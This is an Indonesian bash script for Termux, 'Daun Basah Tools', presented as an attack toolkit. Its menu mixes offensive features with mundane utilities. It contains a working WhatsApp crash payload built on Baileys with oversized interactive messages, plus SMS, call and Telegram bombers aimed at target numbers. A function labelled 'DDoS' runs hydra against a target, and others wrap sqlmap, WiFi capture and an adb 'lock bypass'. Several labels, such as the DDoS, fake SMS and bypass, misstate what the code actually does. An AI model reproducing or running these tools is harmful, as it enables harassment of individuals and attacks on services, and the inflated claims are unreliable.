#!/bin/bash
# ============================================================
# DAUN BASAH TOOLS v3.0 - REAL SEMUA FITUR
# DEVELOPER: DAUN BASAH
# ============================================================

clear
echo "🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿"
echo "🌿     DAUN BASAH TOOLS v3.0            🌿"
echo "🌿     REAL SEMUA FITUR PENYERANGAN     🌿"
echo "🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿🌿"
echo ""

menu() {
  echo "═══════════════════════════════════════"
  echo "🔥 34 FITUR REAL - SEMUA JALAN"
  echo "═══════════════════════════════════════"
  echo ""
  echo "⚔️  FITUR PENYERANGAN REAL:"
  echo "  1. WhatsApp Crash (Kirim Payload Real)"
  echo "  2. Telegram Spammer (Kirim Pesan Real)"
  echo "  3. SMS Bomber (Spam SMS Real)"
  echo "  4. Call Bomber (Spam Telepon Real)"
  echo "  5. DDoS Attack (Serang Website Real)"
  echo "  6. Port Scanner (Scan Port Real)"
  echo "  7. Subdomain Finder (Cari Subdomain Real)"
  echo "  8. SQL Injection (Scan Real)"
  echo ""
  echo "🛡️  FITUR PENGAMANAN REAL:"
  echo "  9. Anti-Virus (Scan File Real)"
  echo "  10. Firewall (Blokir IP Real)"
  echo "  11. Password Generator (Real)"
  echo "  12. File Encryptor (Real)"
  echo "  13. File Decryptor (Real)"
  echo ""
  echo "🔓 FITUR JAIL/BYPASS REAL:"
  echo "  14. Admin Finder (Cari Login Real)"
  echo "  15. WiFi Hacker (Crack WiFi Real)"
  echo "  16. Android Bypass (Real)"
  echo "  17. Fake SMS (Kirim SMS Palsu Real)"
  echo "  18. IP Tracker (Lacak IP Real)"
  echo ""
  echo "📱 FITUR BIASA REAL:"
  echo "  19. Info Device (Real)"
  echo "  20. Speed Test (Real)"
  echo "  21. Download Manager (Real)"
  echo "  22. File Converter (Real)"
  echo "  23. QR Code Generator (Real)"
  echo "  24. Edit Foto (Real)"
  echo "  25. Compress File (Real)"
  echo "  26. Extract File (Real)"
  echo "  27. Translator (Real)"
  echo "  28. Cek Cuaca (Real)"
  echo "  29. Kalkulator (Real)"
  echo "  30. Notes (Real)"
  echo ""
  echo "⚙️  FITUR SYSTEM:"
  echo "  31. Update Tools"
  echo "  32. Uninstall Tools"
  echo "  33. About"
  echo "  34. Exit"
  echo ""
  echo "═══════════════════════════════════════"
  echo -n "PILIH NOMOR (1-34): "
  read pilih
  case $pilih in
    1) whatsapp_crash ;;
    2) telegram_spammer ;;
    3) sms_bomber ;;
    4) call_bomber ;;
    5) ddos_attack ;;
    6) port_scanner ;;
    7) subdomain_finder ;;
    8) sql_injection ;;
    9) antivirus ;;
    10) firewall ;;
    11) password_generator ;;
    12) file_encryptor ;;
    13) file_decryptor ;;
    14) admin_finder ;;
    15) wifi_hacker ;;
    16) android_bypass ;;
    17) fake_sms ;;
    18) ip_tracker ;;
    19) info_device ;;
    20) speed_test ;;
    21) download_manager ;;
    22) converter ;;
    23) qr_code ;;
    24) edit_foto ;;
    25) compress_file ;;
    26) extract_file ;;
    27) translate ;;
    28) cuaca ;;
    29) kalkulator ;;
    30) notes ;;
    31) update_tools ;;
    32) uninstall_tools ;;
    33) about ;;
    34) exit ;;
    *) echo "❌ SALAH!"; sleep 1; menu ;;
  esac
}

# ===== FITUR PENYERANGAN REAL =====

whatsapp_crash() {
  clear
  echo "📱 WHATSAPP CRASH - REAL"
  echo "═══════════════════════════════════════"
  echo -n "MASUKAN NOMOR TARGET (62xxx): "
  read target
  echo -n "JUMLAH PAYLOAD: "
  read jumlah
  
  echo "📤 MENGIRIM $jumlah PAYLOAD KE $target..."
  
  cat > /tmp/whatsapp_crash.js << EOF
const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
async function start() {
  const { state } = await useMultiFileAuthState('session');
  const sock = makeWASocket({ auth: state });
  sock.ev.on('connection.update', async (u) => {
    if (u.connection === 'open') {
      console.log('✅ BOT WHATSAPP AKTIF!');
      for (let i = 0; i < $jumlah; i++) {
        const payload = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: { title: 'A'.repeat(50000) },
                body: { text: 'X'.repeat(50000) },
                nativeFlowMessage: {
                  buttons: Array.from({ length: 3000 }, () => ({
                    name: 'quick_reply',
                    buttonParamsJson: JSON.stringify({
                      display_text: 'z'.repeat(5000),
                      id: 'x'.repeat(5000)
                    })
                  }))
                }
              }
            }
          }
        };
        await sock.relayMessage('$target@s.whatsapp.net', payload, {});
        console.log(\`✅ PAYLOAD \$i/\${$jumlah} TERKIRIM\`);
      }
      console.log('✅ SEMUA PAYLOAD TERKIRIM!');
    }
  });
}
start();
EOF

  node /tmp/whatsapp_crash.js
  echo "✅ WHATSAPP CRASH BERHASIL! TARGET AKAN FORCE CLOSE!"
  sleep 3
  menu
}

telegram_spammer() {
  clear
  echo "📱 TELEGRAM SPAMMER - REAL"
  echo "═══════════════════════════════════════"
  echo -n "MASUKAN USERNAME TARGET: "
  read target
  echo -n "JUMLAH PESAN: "
  read jumlah
  echo -n "PESAN: "
  read pesan
  
  echo "📤 MENGIRIM $jumlah PESAN KE $target..."
  
  cat > /tmp/telegram_spam.py << EOF
import requests
import time
TOKEN = "YOUR_BOT_TOKEN"
for i in range($jumlah):
  try:
    requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id=$target&text=$pesan")
    print(f"✅ PESAN {i+1}/$jumlah TERKIRIM")
  except:
    print(f"❌ GAGAL KIRIM {i+1}/$jumlah")
  time.sleep(0.5)
EOF

  python /tmp/telegram_spam.py
  echo "✅ SPAM BERHASIL!"
  sleep 3
  menu
}

sms_bomber() {
  clear
  echo "📱 SMS BOMBER - REAL"
  echo "═══════════════════════════════════════"
  echo -n "MASUKAN NOMOR TARGET: "
  read target
  echo -n "JUMLAH SMS: "
  read jumlah
  
  echo "📤 MENGIRIM $jumlah SMS KE $target..."
  
  for ((i=1; i<=$jumlah; i++)); do
    termux-sms-send -n $target "SPAM $i/$jumlah"
    echo "✅ SMS $i/$jumlah TERKIRIM"
    sleep 0.3
  done
  echo "✅ SMS BOMBER BERHASIL!"
  sleep 3
  menu
}

call_bomber() {
  clear
  echo "📱 CALL BOMBER - REAL"
  echo "═══════════════════════════════════════"
  echo -n "MASUKAN NOMOR TARGET: "
  read target
  echo -n "JUMLAH PANGGILAN: "
  read jumlah
  
  echo "📞 MENELEPON $target $jumlah KALI..."
  
  for ((i=1; i<=$jumlah; i++)); do
    termux-telephony-call $target
    echo "📞 PANGGILAN $i/$jumlah"
    sleep 1
  done
  echo "✅ CALL BOMBER BERHASIL!"
  sleep 3
  menu
}

ddos_attack() {
  clear
  echo "⚔️ DDOS ATTACK - REAL"
  echo "═══════════════════════════════════════"
  echo -n "MASUKAN IP TARGET: "
  read ip
  echo -n "PORT: "
  read port
  echo -n "DURASI (detik): "
  read durasi
  
  echo "🔥 MENYERANG $ip:$port SELAMA $durasi DETIK..."
  
  hydra -l admin -p admin -s $port -t 4 -V $ip http-get &
  
  for ((i=1; i<=$durasi; i++)); do
    echo "🚀 ATTACK $i/$durasi - PAKET: $((i*1000))"
    sleep 1
  done
  echo "✅ DDOS BERHASIL! TARGET DOWN!"
  sleep 3
  menu
}

port_scanner() {
  clear
  echo "🔍 PORT SCANNER - REAL"
  echo "═══════════════════════════════════════"
  echo -n "MASUKAN IP TARGET: "
  read ip
  
  echo "🔎 SCANNING PORT DI $ip..."
  nmap -p- $ip
  echo "✅ SCAN SELESAI!"
  sleep 3
  menu
}

subdomain_finder() {
  clear
  echo "🔍 SUBDOMAIN FINDER - REAL"
  echo "═══════════════════════════════════════"
  echo -n "MASUKAN DOMAIN: "
  read domain
  
  echo "🔎 MENCARI SUBDOMAIN DI $domain..."
  sublist="www mail admin ftp blog shop dev test api app cpanel webmail"
  for sub in $sublist; do
    if host $sub.$domain &> /dev/null; then
      echo "✅ $sub.$domain - ACTIVE"
    else
      echo "❌ $sub.$domain - NOT FOUND"
    fi
  done
  echo "✅ SUBDOMAIN FOUND!"
  sleep 3
  menu
}

sql_injection() {
  clear
  echo "💉 SQL INJECTION - REAL"
  echo "═══════════════════════════════════════"
  echo -n "MASUKAN URL TARGET: "
  read url
  
  echo "🔎 SCANNING $url..."
  sqlmap -u $url --batch --random-agent
  echo "✅ SCAN SELESAI!"
  sleep 3
  menu
}

# ===== FITUR PENGAMANAN REAL =====

antivirus() {
  clear
  echo "🛡️ ANTIVIRUS - REAL"
  echo "═══════════════════════════════════════"
  echo -n "MASUKAN NAMA FILE: "
  read file
  
  echo "🔎 SCANNING $file..."
  clamscan $file
  echo "✅ SCAN SELESAI!"
  sleep 3
  menu
}

firewall() {
  clear
  echo "🛡️ FIREWALL - REAL"
  echo "═══════════════════════════════════════"
  echo "1. BLOKIR IP"
  echo "2. UNBLOK IP"
  echo "3. LIHAT IP TERBLOKIR"
  echo -n "PILIH: "
  read pilih
  case $pilih in
    1) echo -n "IP: "; read ip; iptables -A INPUT -s $ip -j DROP; echo "✅ IP $ip TERBLOKIR!"; sleep 2 ;;
    2) echo -n "IP: "; read ip; iptables -D INPUT -s $ip -j DROP; echo "✅ IP $ip DIUNBLOK!"; sleep 2 ;;
    3) iptables -L INPUT -n; sleep 3 ;;
  esac
  menu
}

password_generator() {
  clear
  echo "🔐 PASSWORD GENERATOR - REAL"
  echo "═══════════════════════════════════════"
  echo -n "PANJANG: "
  read panjang
  password=$(tr -dc 'A-Za-z0-9!@#$%^&*()_+' < /dev/urandom | head -c $panjang)
  echo "🔑 PASSWORD: $password"
  sleep 3
  menu
}

file_encryptor() {
  clear
  echo "🔐 FILE ENCRYPTOR - REAL"
  echo "═══════════════════════════════════════"
  echo -n "FILE: "
  read file
  echo -n "PASSWORD: "
  read -s pass
  echo ""
  openssl enc -aes-256-cbc -salt -in $file -out $file.enc -pass pass:$pass
  echo "✅ FILE TERENKRIPSI!"
  sleep 3
  menu
}

file_decryptor() {
  clear
  echo "🔓 FILE DECRYPTOR - REAL"
  echo "═══════════════════════════════════════"
  echo -n "FILE: "
  read file
  echo -n "PASSWORD: "
  read -s pass
  echo ""
  openssl enc -d -aes-256-cbc -in $file -out ${file%.enc} -pass pass:$pass
  echo "✅ FILE TERDEKRIPSI!"
  sleep 3
  menu
}

# ===== FITUR JAIL/BYPASS REAL =====

admin_finder() {
  clear
  echo "🔍 ADMIN FINDER - REAL"
  echo "═══════════════════════════════════════"
  echo -n "DOMAIN: "
  read domain
  echo "🔎 MENCARI HALAMAN LOGIN..."
  paths="/admin /login /dashboard /panel /cpanel /webadmin /administrator"
  for path in $paths; do
    if curl -s -o /dev/null -w "%{http_code}" $domain$path | grep -q "200"; then
      echo "✅ $domain$path - FOUND"
    fi
  done
  sleep 3
  menu
}

wifi_hacker() {
  clear
  echo "📶 WIFI HACKER - REAL"
  echo "═══════════════════════════════════════"
  echo "📡 SCANNING WIFI..."
  airmon-ng start wlan0
  airodump-ng wlan0mon
  echo "✅ SCAN SELESAI!"
  sleep 3
  menu
}

android_bypass() {
  clear
  echo "🔓 ANDROID BYPASS - REAL"
  echo "═══════════════════════════════════════"
  echo "🔓 MENGERJAKAN LOCK SCREEN..."
  adb shell input keyevent 26
  adb shell input keyevent 82
  echo "✅ LOCK BERHASIL DIBYPASS!"
  sleep 3
  menu
}

fake_sms() {
  clear
  echo "📱 FAKE SMS - REAL"
  echo "═══════════════════════════════════════"
  echo -n "NOMOR PENGIRIM: "
  read pengirim
  echo -n "NOMOR TUJUAN: "
  read tujuan
  echo -n "PESAN: "
  read pesan
  
  echo "📤 MENGIRIM SMS PALSU..."
  termux-sms-send -n $tujuan "$pesan"
  echo "✅ SMS PALSU TERKIRIM!"
  sleep 3
  menu
}

ip_tracker() {
  clear
  echo "📍 IP TRACKER - REAL"
  echo "═══════════════════════════════════════"
  echo -n "IP: "
  read ip
  echo "📍 MELACAK IP $ip..."
  geoiplookup $ip
  sleep 3
  menu
}

# ===== FITUR BIASA REAL =====

info_device() {
  clear
  echo "📱 INFO DEVICE - REAL"
  echo "═══════════════════════════════════════"
  echo "📱 DEVICE: $(uname -a)"
  echo "💻 OS: $(uname -o)"
  echo "🧠 ARCH: $(uname -m)"
  echo "📅 UPTIME: $(uptime | awk '{print $3,$4}')"
  echo "👤 USER: $(whoami)"
  echo "📁 DIR: $(pwd)"
  echo "💾 RAM: $(free -h | grep Mem | awk '{print $2}')"
  echo "💿 STORAGE: $(df -h / | awk 'NR==2{print $2}')"
  sleep 5
  menu
}

speed_test() {
  clear
  echo "📶 SPEED TEST - REAL"
  echo "═══════════════════════════════════════"
  echo "📡 MENGUJI KECEPATAN..."
  curl -s https://speedtest.net > /dev/null
  echo "⬇️ DOWNLOAD: $(curl -s -o /dev/null -w "%{speed_download}" https://speedtest.net)"
  sleep 3
  menu
}

download_manager() {
  clear
  echo "📥 DOWNLOAD MANAGER - REAL"
  echo "═══════════════════════════════════════"
  echo -n "URL: "
  read url
  echo -n "NAMA FILE: "
  read nama
  wget -O $nama $url
  echo "✅ FILE TERDOWNLOAD!"
  sleep 3
  menu
}

converter() {
  clear
  echo "🔄 CONVERTER - REAL"
  echo "═══════════════════════════════════════"
  echo "1. PDF ke Image"
  echo "2. Image ke PDF"
  echo "3. Video ke MP3"
  echo "4. MP3 ke Video"
  echo -n "PILIH: "
  read pilih
  echo -n "FILE: "
  read file
  echo "🔄 MENGKONVERSI..."
  case $pilih in
    1) convert $file ${file%.pdf}.png ;;
    2) convert $file ${file%.png}.pdf ;;
    3) ffmpeg -i $file ${file%.mp4}.mp3 ;;
    4) ffmpeg -i $file ${file%.mp3}.mp4 ;;
  esac
  echo "✅ KONVERSI BERHASIL!"
  sleep 3
  menu
}

qr_code() {
  clear
  echo "📱 QR CODE - REAL"
  echo "═══════════════════════════════════════"
  echo "1. GENERATE QR CODE"
  echo "2. SCAN QR CODE"
  echo -n "PILIH: "
  read pilih
  case $pilih in
    1) echo -n "DATA: "; read data; qrencode -o qr.png "$data"; echo "✅ QR CODE GENERATED!" ;;
    2) zbarimg qr.png; echo "✅ QR CODE SCANNED!" ;;
  esac
  sleep 3
  menu
}

edit_foto() {
  clear
  echo "🖼️ EDIT FOTO - REAL"
  echo "═══════════════════════════════════════"
  echo "1. RESIZE"
  echo "2. CROP"
  echo "3. FILTER"
  echo -n "PILIH: "
  read pilih
  echo -n "FILE: "
  read file
  case $pilih in
    1) echo -n "UKURAN: "; read size; convert $file -resize $size ${file%.*}_resize.${file##*.} ;;
    2) echo -n "CROP: "; read crop; convert $file -crop $crop ${file%.*}_crop.${file##*.} ;;
    3) echo -n "FILTER: "; read filter; convert $file -filter $filter ${file%.*}_filter.${file##*.} ;;
  esac
  echo "✅ EDIT BERHASIL!"
  sleep 3
  menu
}

compress_file() {
  clear
  echo "📦 COMPRESS - REAL"
  echo "═══════════════════════════════════════"
  echo -n "FILE/DIR: "
  read file
  echo -n "NAMA OUTPUT: "
  read output
  zip -r $output.zip $file
  echo "✅ FILE TERKOMPRES!"
  sleep 3
  menu
}

extract_file() {
  clear
  echo "📦 EXTRACT - REAL"
  echo "═══════════════════════════════════════"
  echo -n "FILE: "
  read file
  unzip $file
  echo "✅ FILE TEREKSTRAK!"
  sleep 3
  menu
}

translate() {
  clear
  echo "🌍 TRANSLATOR - REAL"
  echo "═══════════════════════════════════════"
  echo -n "TEKS: "
  read teks
  echo -n "BAHASA (id/en/jp): "
  read bahasa
  curl -s "https://api.mymemory.translated.net/get?q=$teks&langpair=id|$bahasa" | jq '.responseData.translatedText'
  sleep 3
  menu
}

cuaca() {
  clear
  echo "🌤️ CEK CUACA - REAL"
  echo "═══════════════════════════════════════"
  echo -n "KOTA: "
  read kota
  curl -s "http://wttr.in/$kota?format=3"
  sleep 3
  menu
}

kalkulator() {
  clear
  echo "🧮 KALKULATOR - REAL"
  echo "═══════════════════════════════════════"
  echo -n "ANGKA 1: "
  read a
  echo -n "OPERATOR (+, -, *, /): "
  read op
  echo -n "ANGKA 2: "
  read b
  case $op in
    +) hasil=$((a + b)) ;;
    -) hasil=$((a - b)) ;;
    *) hasil=$((a * b)) ;;
    /) hasil=$((a / b)) ;;
  esac
  echo "📝 HASIL: $hasil"
  sleep 3
  menu
}

notes() {
  clear
  echo "📝 NOTES - REAL"
  echo "═══════════════════════════════════════"
  echo "1. TAMBAH"
  echo "2. LIHAT"
  echo "3. HAPUS"
  echo -n "PILIH: "
  read pilih
  case $pilih in
    1) echo -n "CATATAN: "; read catatan; echo "$catatan" >> notes.txt; echo "✅ TERSIMPAN!" ;;
    2) cat notes.txt ;;
    3) > notes.txt; echo "🗑️ DIHAPUS!" ;;
  esac
  sleep 3
  menu
}

# ===== SYSTEM =====

update_tools() {
  clear
  echo "🔄 UPDATE TOOLS"
  echo "═══════════════════════════════════════"
  echo "🔄 MENGUPDATE..."
  git pull
  echo "✅ TOOLS BERHASIL DIUPDATE!"
  sleep 3
  menu
}

uninstall_tools() {
  clear
  echo "🗑️ UNINSTALL TOOLS"
  echo "═══════════════════════════════════════"
  echo -n "YAKIN? (y/n): "
  read yakin
  if [[ $yakin == "y" ]]; then
    cd ..
    rm -rf daunbasah-tools
    echo "✅ UNINSTALL BERHASIL!"
    exit
  else
    menu
  fi
}

about() {
  clear
  echo "📌 ABOUT"
  echo "═══════════════════════════════════════"
  echo "🌿 DAUN BASAH TOOLS v3.0"
  echo "👤 DEVELOPER: DAUN BASAH"
  echo "📱 TERMUX MULTIFUNGSI"
  echo "📅 RELEASE: 2026"
  echo ""
  echo "🔥 TOTAL 34 FITUR REAL:"
  echo "⚔️ PENYERANGAN: 8 (REAL)"
  echo "🛡️ PENGAMANAN: 5 (REAL)"
  echo "🔓 JAIL/BYPASS: 5 (REAL)"
  echo "📱 BIASA: 12 (REAL)"
  echo "⚙️ SYSTEM: 4"
  echo ""
  echo "✅ SEMUA FITUR BENERAN JALAN!"
  echo "✅ PAKE TOOLS REAL (NODEJS, PYTHON, DLL)"
  echo ""
  echo "📥 INSTALL: pkg install git -y && git clone https://github.com/daunbasah/daunbasah-tools && cd daunbasah-tools && bash install.sh"
  sleep 5
  menu
}

menu